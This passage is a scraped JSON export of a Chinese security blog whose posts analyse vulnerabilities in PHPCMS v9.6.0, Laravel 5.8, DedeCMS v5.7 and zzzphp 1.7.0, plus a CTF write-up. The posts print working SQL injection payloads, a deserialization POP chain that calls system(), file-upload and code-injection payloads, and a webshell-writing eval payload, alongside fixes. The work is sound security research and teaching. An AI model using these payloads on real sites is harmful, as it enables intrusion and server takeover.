123m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%2\\7 and extractvalue(1,concat(0x7e,database(),0x7e))#%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23 1http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;filename&#x3D;&amp;src&#x3D;%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23 得到 1GumfD_att_json&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM 再去down.php想办法调用 访问 1http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM 提示参数错误，？？？？不应该啊 看了下力哥的，唯一的差别是传src=时m=1前多个&amp;，我加上后试了下果然可以 这里是个trick 1$a_k &#x3D; &#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%27 and extractvalue(1,concat(0x7e,database(),0x7e))#&quot;,&quot;filename&quot;:&quot;&quot;&#125; 如果不加&amp;，打印变量 那么真相大白，其实&amp;相当于分隔符，感觉这里的parse_str()用的挺奇怪的 加上&amp;后成功 虽然mysql报错了，但是这里报错的原因是我的mysql版本为5.0.96，而5.1.5以上才支持这个函数，但是sql语句是没问题的，盲注也可以 四、修复方案对sql查询的$id进行intval()过滤 参考链接 https://zhzhdoai.github.io/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"phpcms_v9.6.0任意文件上传漏洞分析","slug":"phpcms-v9-6-0任意文件上传漏洞分析","date":"2019-11-07T14:56:10.000Z","updated":"2020-04-02T07:46:22.903Z","comments":true,"path":"2019/11/07/phpcms-v9-6-0任意文件上传漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/11/07/phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 四、修复方案 参考链接： 一、获取漏洞phpcms_v9.6.0_UTF8 下载链接：http://download.phpcms.cn/v9/9.6/ 二、漏洞实现参考漏洞分析最后一步，偷懒 三、漏洞分析还好之前挖掘phpcms_v9.6.3的时候对整体架构有了一定了解 漏洞存在于用户注册处， phpcms/modules/member/index.php 追踪member_input类的get()方法 phpcms/modules/member/fields/member_input.class.php 由于get()方法代码较长，只贴下面关键两行，存在动态方法调用，那么先追踪$func，即$this-&gt;fields[$field][&#39;formtype&#39;] 搜索下，发现是在构造函数中 12function __construct($modelid) &#123; $this-&gt;fields &#x3D; getcache(&#39;model_field_&#39;.$modelid,&#39;model&#39;); 追踪getcache()，目测是从这个拼接成的文件名中读取内容 phpcms/libs/functions/global.func.php 传入$name为model_field_xxx和$filpath为model，$config=&#39;&#39;，所以追踪 $cache = cache_factory::get_instance()-&gt;get_cache($type); phpcms/libs/classes/cache_factory.class.php $cache是个缓存工厂类，追踪cache_file类的get()方法 ok，那么路径知道了，追踪下，发现啥都没，因为自己安装完这个cms之后还没访问过，当然没缓存了。 注册一个用户后，再次查看caches文件夹 在caches/caches_model/caches_data/model_field_1.cache.php中 这里找到editor()函数（感觉这里还是比较花时间的） caches/caches_model/caches_data/member_input.class.php 跟踪$this-&gt;attachment 12function __construct($modelid) &#123; $this-&gt;attachment &#x3D; new attachment(&#39;content&#39;,&#39;0&#39;,$this-&gt;siteid); 跟踪download() 追踪$this-&gt;upload_func 12function __construct($module&#x3D;&#39;&#39;, $catid &#x3D; 0,$siteid &#x3D; 0,$upload_dir &#x3D; &#39;&#39;) &#123; $this-&gt;upload_func &#x3D; &#39;copy&#39;; copy()可以实现远程文件下载 查看具体变量 跟踪fillurl()，代码有点长，主要是截取#之前的字符串 那么尝试构造 123http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;member&amp;c&#x3D;index&amp;a&#x3D;register&amp;siteid&#x3D;1POST:siteid&#x3D;1&amp;modelid&#x3D;1&amp;info[content]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;2.php#.jpg&amp;username&#x3D;3333&amp;password&#x3D;333333&amp;pwdconfirm&#x3D;333333&amp;email&#x3D;33%40qq.com&amp;nickname&#x3D;3333&amp;info%5Bbirthday%5D&#x3D;&amp;dosubmit&#x3D;%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol&#x3D; 发现这里断了，这里正则匹配，那么前面加个src= 1siteid&#x3D;1&amp;modelid&#x3D;1&amp;info[content]&#x3D;src&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;2.php#.jpg&amp;username&#x3D;3333&amp;password&#x3D;333333&amp;pwdconfirm&#x3D;333333&amp;email&#x3D;33%40qq.com&amp;nickname&#x3D;3333&amp;info%5Bbirthday%5D&#x3D;&amp;dosubmit&#x3D;%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol&#x3D; 成功，文件名可预测，这里我们调试的时候可见一斑 四、修复方案 对上传的文件后缀进行限制，仍然可以上传图片马，但是需要配合文件包含等漏洞 纸上得来终觉浅，绝知此事要躬行。看懂了未必会用，况且未必真的看懂了 参考链接： https://zhzhdoai.github.io/2019/10/10/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"laravel5.8反序列化漏洞分析","slug":"laravel5-8反序列化漏洞分析","date":"2019-11-05T08:37:02.000Z","updated":"2020-04-02T07:34:30.870Z","comments":true,"path":"2019/11/05/laravel5-8反序列化漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/11/05/laravel5-8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 漏洞搭建 漏洞分析 参考链接 漏洞搭建做buuoj的时候遇到的 - [CISCN2019 总决赛 Day1 Web4]Laravel1 有个非预期，payload留在logs中，因为storage/logs存在日志 laravel5.8 漏洞分析存在反序列化，那么难点就是寻找POP链 全局搜索__destruct()，有很多，但是经验多了判断起来就快了。。。 我直接看存在POP链的地方 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php 跟踪invalidateTags() 跟踪$this-&gt;pool，这是一个我们可控的变量，那么全局搜索saveDeferred() 感觉vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php可能有戏 跟踪doSave() 存在动态调用，这里可以用system()，最多两个参数 那么分析变量 $this-&gt;setInnerItem可控，$innerItem是我们传入的$item类中的$innerItem属性 引用七月火师傅的话 首先，程序将 $item 类强转成数组（上图 第207行 ），然后再从数组中取值作为下面动态调用函数的参数（上图 第213行 ）。这里可以看到有 $item[“\\0*\\0expiry”]、$item[“\\0*\\0poolHash”] 这种写法，数组键名带有 \\0*\\0 。这实际上是类中，修饰符为 protected 的属性，在类强转成数组之后的结果。 1if (!$item instanceof CacheItem) &#123; 实例化一个绕过即可 构造payload 1234567891011121314151617181920212223242526272829&lt;?phpnamespace Symfony\\Component\\Cache;class CacheItem &#123; protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;&#125;namespace Symfony\\Component\\Cache\\Adapter;class ProxyAdapter&#123; private $setInnerItem &#x3D; &#39;system&#39;;&#125;class TagAwareAdapter&#123; public $deferred &#x3D; []; public function __construct() &#123; $this-&gt;pool &#x3D; new ProxyAdapter(); &#125;&#125;$a &#x3D; new TagAwareAdapter();$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \\Symfony\\Component\\Cache\\CacheItem);echo urlencode(serialize($a)); 自己踩了几个坑，对php语法掌握不熟练 private $deferred = array();需要修改成public $deferred = array();和源码一致 class ProxyAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterface实现的接口不需要写 public $deferred = array(&#39;aa&#39;=&gt;new \\Symfony\\Component\\Cache\\CacheItem);在类中这种写法不允许， 类（对象）的属性是不能用非常量来初始化的！ 非常量是指变量，或函数返回值等 =====================分割线 1、在一些特定版本下，public和private可以通用，不会影响整个反序列化流程，但是这题好巧不巧，正好碰到了一个不可通用的，字段该什么属性就得什么属性。 2、理论上序列化确实没必要写接口，一般都是变量的操作 3、一般在__construct()中写 ====================分割线 看wp的时候看到szs， 利用highlight_file(&#39;/flag&#39;,null) ，但是这里第二个参数$item要为null，似乎不好构造 最后整理下POP链 TagAwareAdapter.php-&gt;__destruct()-&gt;commit()-&gt;invalidateTags()-&gt;$this-&gt;pool-&gt;saveDeferred($item) ProxyAdapter.php-&gt;saveDeferred()-&gt;doSave()-&gt;($this-&gt;setInnerItem)($innerItem, $item) 参考链接 https://xz.aliyun.com/t/5911#toc-2","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"上海市网络安全大赛-wp","slug":"上海市网络安全大赛-wp","date":"2019-11-02T08:52:39.000Z","updated":"2020-04-10T13:33:54.145Z","comments":true,"path":"2019/11/02/上海市网络安全大赛-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/02/%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 WEB1 WEB2 WEB3 WEB4 参考链接： WEB1 原题的payload 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))))); 这里是bytectf的升级版，函数只能由[a-z]，没有下划线。。。并且过滤了readfile，time，et readfile()，可用echo()或者die()代替 然后是由于sqrt()被过滤，导致得重新fuzz出一个点来 1chr(ceil(sinh(cosh(tan(floor(abs(tan(cosh(floor(phpversion())))))))))) 下面是之后fuzz出0时的截图 将payload拆开来，那么只需要找出任意一步产生相同值即可 12345678910&lt;?php $a &#x3D; [&#39;sinh(&#39;,&#39;ceil(&#39;,&#39;cosh(&#39;,&#39;tan(&#39;,&#39;floor(&#39;,&#39;abs(&#39;]; foreach($a as $i)&#123; foreach($a as $j)&#123; foreach($a as $k)&#123; $res &#x3D; $i.$j.$k.&#39;0)))&#39;; echo &#39;echo &#39;.$res.&#39;.&quot;\\n&quot;;&#39;.&quot;\\n&quot;; &#125; &#125; &#125; 将结果直接复制到另一个脚本中跑😁 那么这个1.46只需要ceil()即可产生2 构造出点后，构造点点 1next(scandir(&#39;.&#39;)) 然后需要解决的是chdir()的返回值传给一个函数，并且返回值为数字。。。 我利用的是ord(phpversion(chdir(&#39;..&#39;)))返回0， 这里其实tan()、sin()等数学函数都可以，这里返回的true会转化为1，自己算是多此一举了 最后读取，利用end()读取文件名，implode()将file()按行读取的内容合并成字符串，echo()即可 1echo(implode(file(end(scandir(chr(ceil(sinh(cosh(tan(ceil(sinh(sinh(cosh(ord(phpversion(chdir(next(scandir(next(scandir(chr(ceil(sinh(cosh(tan(floor(abs(tan(cosh(floor(phpversion()))))))))))))))))))))))))))))))); WEB2安恒杯月赛原题,payload都不用换，8说了 https://www.jianshu.com/p/804d95f6d6fb?tdsourcetag=s_pctim_aiomsg WEB3主要过滤了and,or,select union,逗号等 考虑联合注入 盲注也可，or用||代替 不带逗号的联合注入（本地） 1select * from users where id&#x3D;1 union&#x2F;**&#x2F;select * from ((select 1)a join (select 2)b join (select 1)c) payload 10&#39; union&#x2F;**&#x2F;select * from ((select 1)a join (select 2)b join (select 3)C join(select 4)D)# 1%30%27%20%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%28%28%73%65%6c%65%63%74%20%31%29%61%20%6a%6f%69%6e%20%28%73%65%6c%65%63%74%20%32%29%62%20%6a%6f%69%6e%20%28%73%65%6c%65%63%74%20%31%29%43%20%6a%6f%69%6e%28%73%65%6c%65%63%74%20%32%29%44%29%23 过滤了or，考虑innodb， MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了innodb_table_stats 和innodb_index_stats这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。如果waf掉了information我们可以利用这两个表注入数据库名和表名。 有点奇怪的是数据库版本是5.6.46 幸运的是下面的payload查到了表名 12select group_concat(distinct database_name) from mysql.innodb_index_statsselect group_concat(distinct table_name) from mysql.innodb_index_stats 考虑无列名注入(需要猜测字段数) 1select GROUP_CONCAT(&#96;3&#96;) from (select * from((select 1)A Join (select 2)B join (select 3)C) union&#x2F;**&#x2F;select * from users)D 最终payload 1?id&#x3D;0%27%20UNION&#x2F;**&#x2F;select%20*%20from%20((((select%201)A%20join%20((select%20GROUP_CONCAT(%603%60)%20from%20(select%20*%20from((select%201)A%20Join%20(select%202)B%20join%20(select%203)C)%20union&#x2F;**&#x2F;select%20*%20from%20fl111aa44a99g)T))B)%20join%20(select%203)C)join%20(select%204)D)%23 1?id&#x3D;0&#39; UNION&#x2F;**&#x2F;select * from ((((select 1)A join ((select GROUP_CONCAT(&#96;3&#96;) from (select * from((select 1)A Join (select 2)B join (select 3)C) union&#x2F;**&#x2F;select * from fl111aa44a99g)T))B) join (select 3)C)join (select 4)D)# WEB42019巅峰极客一道题的升级版 https://www.4hou.com/web/21053.html 由于我无法目录遍历读取源码，导致没的搞了。。。 参考链接： https://www.anquanke.com/post/id/186187#h3-1","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"dedecms_v5.7漏洞分析-2","slug":"dedecms-v5-7漏洞分析-2","date":"2019-09-23T23:24:11.000Z","updated":"2020-04-10T03:08:35.116Z","comments":true,"path":"2019/09/24/dedecms-v5-7漏洞分析-2/","link":"","permalink":"https://glotozz.github.io/2019/09/24/dedecms-v5-7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 四、漏洞修复 参考链接 一、获取漏洞Dedecms V5.7 二、漏洞实现 漏洞一（DedeCMS V5.7 SP2前台文件上传漏洞 (CVE-2018-20129)） 开启会员功能，进入会员中心，内容中心，发表文章 上传到服务器时抓包，将filename修改为1.jpg.p*hp，得到上传成功的地址 蚁剑连接 漏洞二 前台任意用户密码修改 Paylaod: 创建一个用户123，id为9作为我们要修改密码的对象 再创建一个用户456，登录后访问下面的payload 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;member&#x2F;resetpassword.php?i&#x3D;0.0&amp;dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;9 抓包 访问 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;9&amp;key&#x3D;8oav2fjP 即可重置密码 漏洞三 任意用户登录 前台会员模块是采用Cookie中的 DedeUserID+DedeUserID__ckMd5字段进行身份鉴别 DedeUserID用于定位区别用户，DedeUserID__ckMd5则是服务器生成散列，用于安全验证 Dedecms一处代码由于逻辑不够严谨，导致可以输入字符并获得服务器生成散列 劫持DedeUserID__ckMd5字段，绕过安全校验，配合类型转换造成任意用户登录漏洞 注册一个普通用户，用户名满足数字1+字母的形式，或者经过intval()后值为1， 访问用户主页，记录cookie中last_vid__ckMd5的值 访问index页面，替换cookie中DedeUserID和DedeUserID__ckMd5的值，替换成我们注册的用户名和last_vid__ckMd5，就能登录到前台admin 比如1aaa,访问空间 修改DeDeUserID和DeDeUserID_CKmD5 漏洞四 漏洞二+漏洞三的组合拳，修改后台管理员admin密码 因为漏洞二只能修改前台member中admin密码，但是会员又无法登录前台，利用漏洞三可前台登录admin，进入member/edit_baseinfo.php，修改密码即可，原登录密码是dede_member表中admin的密码 利用漏洞三中的方法admin访问http://127.0.0.1/dede/member/edit_baseinfo.php 修改密码 注意这里还是要发包修改DedeUserID+DedeUserID__ckMd5，成功修改后台admin密码 登录后台成功 三、漏洞分析 漏洞一 查看文件上传处的源码（bp抓包查看文件位置即可） select_images_post.php preg_replace()将\\r\\n\\t*%?&lt;&gt;|”:替换为空，所以修改filename时&lt;&gt;%等也可以 1$cfg_imgtype &#x3D; &#39;jpg|gif|png&#39;; preg_match()判断是否能匹配到$cfg_imgtype 之后是对文件名进行重命名，但是不影响 漏洞二 /member/resetpassword.php 我们传入id=1，数据库查询如下结果 ==弱相等比较+empty()，如果传入0也不行，因为0无法绕过empty()，我们传入safequestion=0.0&amp;safeanswer=，当然16进制也可以0x0 即可进入sn()，追踪sn() 这里查询一个临时密码表，如果不存在对应的数据row就发送邮件，当然一开始是不存的，查看newmail() 存在一个对#@__pwd_tmp表insert操作，之后重定向 访问修改密码。 但是这里admin默认无法在会员中心登录。。。但是可以修改其他任意用户，只是要求当前用户没有填写密保问题 漏洞三 从member/index.php入手，因为最后我们是修改DeDeUserID和DeDeUserID_CKmD5来绕过登录 存在IsLogin()判断，跟进isLogin()函数 跟进$this-&gt;M_ID 跟进GetNum() 将非(数字或点)的替换为空，继续跟进GetCookie() 判断cookie中的DeDeUserID_ckMd5与md5($cfg_cookie_encode.$_COOKIE[$key])的前16位比较是否相等，只要过了这个判断就没啥问题了。我们可以利用任意用户的一组来绕过，但是DeDeUserID经过GetNum()要为1，比如1aaaa，或者intcal()后为1，比如0000001，利用这里的漏洞，即可成功登录admin 那么如何获取DeDeUserID_ckMd5与md5($cfg_cookie_encode.$_COOKIE[$key]) 存在PutCookie()，跟进下 所以访问会员空间主页即可得到last_vid和last_vid__ckMd5。 漏洞四 主要是修改个人信息edit_baseinfo.php中存在如果是管理员，修改其后台密码。。。😋 具体细节就是漏洞二三 四、漏洞修复对于漏洞一，可以对取到的$fs[count($fs)-1]进行白名单校验，而不是直接对filename进行preg_match() 对于漏洞二，resetpassword.php文件84行 1if($row[&#39;safequestion&#39;] &#x3D;&#x3D; $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] &#x3D;&#x3D; $safeanswer) 修改为强相等，或者强制要求用户设置密保问题 对于漏洞三，将生成不同场景下cookie使用的$cfg_cookie_encode变量区分开来，避免相同。或者用session存储 对于漏洞四，直接删去对后台密码的修改 参考链接https://mp.weixin.qq.com/s/PCg973wOTeVYvb8-b6R3ZA https://mochazz.github.io/ https://xz.aliyun.com/t/1961 http://blog.nsfocus.net/dedecms-loophole-2/","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"dedecms_v5.7漏洞分析","slug":"dedecms-v5-7漏洞分析","date":"2019-09-22T23:21:12.000Z","updated":"2020-04-02T02:42:27.151Z","comments":true,"path":"2019/09/23/dedecms-v5-7漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/09/23/dedecms-v5-7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 四、漏洞修复 参考链接 一、获取漏洞dedecms V5.7 二、漏洞实现Payload1 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;sys_verifies.php?action&#x3D;getfiles&amp;refiles[]&#x3D;\\%22;phpinfo();&#x2F;&#x2F; Payload2 12http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;stepselect_main.php?action&#x3D;addenum_save&amp;ename&#x3D;233&amp;issign&#x3D;1&amp;egroup&#x3D;;phpinfo();$http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;data&#x2F;enums&#x2F;;phpinfo();$.php Payload3 12http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;token&#x3D;57b2990048a7dbd3c782cddc0a049a0d&amp;filename&#x3D;glotozz.lib.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;include&#x2F;taglib&#x2F;glotozz.lib.php Payload4 12插入ad内容 --&gt;&lt;?php phpinfo();?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;plus&#x2F;ad_js.php?nocache&#x3D;1&amp;aid&#x3D;1 三、漏洞分析 先根据payload1自己在当前文件寻找分析一波 搜索fwrite()，发现第一处 追踪变量$tmpdir 打扰了。。。查看第二处 搜索下$refiles，是我们直接传入的变量。。。 先截取[3:]，中间的可以不管，因为不影响$filename，$i++，写入格式大概如下 123&lt;?php$files[0]&#x3D;&quot;xxx&quot;;?&gt; 构造如下即可 123&lt;?php$files[0]&#x3D;&quot;&quot;;phpinfo();&#x2F;&#x2F;&quot;;?&gt; 对那个截取[3:]有点疑惑，构造 “;phpinfo();// 调试打印下$filename，发现原来是存在addslashes() 既然是截取[3:]，构造如下即可 123\\&quot;&#x3D;&gt;\\\\\\&quot; 查看modifytmp.inc 成功写入后考虑包含的地方，发现就在下面。。。所以上面我们的payload只需要一个action=getfiles即可 但是这里我们不重新访问action=down也可以，因为getfiles中下面的语句就是去加载模板文件，而模版文件中iframe加载了我们需要的down，当然我们自己去访问也行，还可以控制参数 Payload1的漏洞成因主要是fwrite，以及先addslashes()后进行了substr()截取 分析下Paylaod2 这里是利用enums.func.php中的fwrite() 写入格式大概如下 123&lt;?phpglobal $em_&quot;&quot;s;$em_&quot;&quot;s &#x3D; array(); 尝试构造 123456&lt;?phpglobal $em_;phpinfo();$s;$em_&quot;&quot;s &#x3D; array();&#x3D;&#x3D;&gt;;phpinfo();$ 搜索调用该函数的地方，并且我们控制传入的变量,且没有严格过滤 stepselect_main.php中的action=addnum_save 传入$ename和$egroup和$issign=1即可， 查看data/enums/;phpinfo();$.php 访问即可 Payload3 在tpl.php中寻找fwrite() 文件名要求由[a-z0-9_-]组成，后缀为.lib.php stripslashes()函数删除由 addslashes()函数添加的反斜杠，文件内容不影响 还要注意的就是开头有个csrf_check() 继续搜索$_SESSION[&#39;token&#39;] 调用这里的action=upload得到token即可，可以从前端那个隐藏的input获取，其实就是make_hash()，打个断点即可 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;token&#x3D;57b2990048a7dbd3c782cddc0a049a0d&amp;filename&#x3D;glotozz.lib.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; 再去找到文件路径DEDEINC，随便找个地方打个断点即可 访问即可 Paylaod4 ad_js.php存在fwrite()+include 从数据库#@__myad读取，搜索插入数据库的地方 ad_add.php 发现没有什么对我们有影响的过滤，直接在前端页面插入，注意闭合前面的–&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;ad_add.php 1--&gt;&lt;?php phpinfo();?&gt; 再次访问即可 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;plus&#x2F;ad_js.php?arcID&#x3D;1&amp;nocache&#x3D;1 四、漏洞修复大多数都是fwrite()时没有对用户输入的内容进行严格过滤，都可以简单闭合或拼接插入恶意代码，过滤一些关键字符。 第四处是sql插入数据库的数据没有进行处理，比如可以实体编码，但是这样可能功能实现方面会不同。 复现完了四个dedecms，发现网上还有好多dedecms的漏洞，明天可以再写一篇。。。 因为刚刚开始代码审计，现在主要还是跟着复现，可以先根据paylaod自己进行分析，并且某个存在漏洞php文件中可能存在不止一个触发漏洞的函数，也可以多尝试其他函数 参考链接https://mochazz.github.io https://zhzhdoai.github.io https://xz.aliyun.com/t/2237","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"zzzphp1.7.0远程代码执行分析","slug":"zzzphp1-7-0远程代码执行分析","date":"2019-09-19T09:45:25.000Z","updated":"2020-03-28T00:59:37.712Z","comments":true,"path":"2019/09/19/zzzphp1-7-0远程代码执行分析/","link":"","permalink":"https://glotozz.github.io/2019/09/19/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 四、漏洞修复 参考链接 一、获取漏洞zzzphp1.7.0远程代码执行 二、漏洞实现管理员后台-模板管理-html-search.php 修改（增加）如下 1&#123;if:1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.pphphp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&#39;));&#x2F;&#x2F;&#125;&#123;end if&#125; 访问生成我们的恶意文件 1http:&#x2F;&#x2F;127.0.0.1&#x2F;zzzctf&#x2F;search&#x2F; 三、漏洞分析 漏洞成因最主要还是使用str_ireplace()函数来过滤用户输入，导致可以双写绕过 index.php引入&#39;inc/zzz_client.php&#39;; 在zzz_client.php中引入模板并使用getlocation() switch匹配search模板 实例化模板，调用parseCommon() 查看parseCommon()函数，存在parserIfLabel() 正则匹配{if:xxx}xxx{end if}，用户传入的数据用danger_key()过滤 跟踪danger_key()，使用str_ireplace()将用户关键词替换为*，之后直接进入eval()函数 因此，我们考虑用str_replace()将*替换为空，$被替换我们可以使用get_defined_vars()来获取参数，之前codebreaking-4中也有涉及，apache中可以使用getallheaders(),nginx使用get_defined_vars() 构造payload（参考链接里面的师傅） 1&#123;if:1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.pphphp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&#39;));&#x2F;&#x2F;&#125;&#123;end if&#125; 具体执行代码 1、//闭合后面的括号) 123&lt;?php $a &#x3D; &#39;1)phpinfo();&#x2F;&#x2F;&#39;; eval(&#39;if(1&#39;.$a.&#39;)&#39;); 2、 3、 12341)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.p*hp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&#39;));&#x2F;&#x2F;&#x3D;&#x3D;&gt;@eval(&#39;if(1)file_put_contents(str_replace(&#39;*&#39;,&#39;&#39;,&#39;glotozz.p*hp&#39;),str_replace(&#39;*&#39;,&#39;&#39;,&#39;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&#39;));&#x2F;&#x2F;&#39;) 